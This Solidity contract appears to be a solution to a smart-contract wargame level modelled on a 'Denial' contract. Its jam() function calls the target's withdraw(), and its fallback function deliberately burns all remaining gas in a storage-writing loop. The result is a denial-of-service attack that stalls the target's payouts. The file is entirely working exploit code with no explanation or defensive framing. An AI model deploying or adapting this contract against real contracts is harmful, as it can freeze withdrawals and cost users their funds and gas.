// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IDenial {
    function withdraw() external;
}


contract DOS {

    IDenial denialContract;
    constructor(address _denialContract) public {
        denialContract = IDenial(_denialContract);
    }
    function jam() public {
        denialContract.withdraw();
    }

    fallback() external payable {
        // Gas exhausting
        while (gasleft() > 0) {
            assembly {
                let c := add(4, 696969696)
                sstore(0x80,c)
            }
        }
    }
}